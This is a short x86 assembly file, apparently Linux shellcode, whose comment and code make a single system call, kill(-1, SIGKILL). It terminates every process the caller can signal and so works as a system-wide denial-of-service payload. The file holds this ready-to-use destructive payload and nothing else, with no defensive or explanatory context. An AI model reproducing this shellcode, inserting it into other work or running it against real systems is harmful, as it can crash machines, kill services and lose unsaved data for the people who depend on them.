section .text

      global _start

_start:
; kill(-1, SIGKILL)

     xor ecx, ecx
     mul ecx
     mov al, byte 37
     dec ebx
     mov cl, byte 9
     int 0x80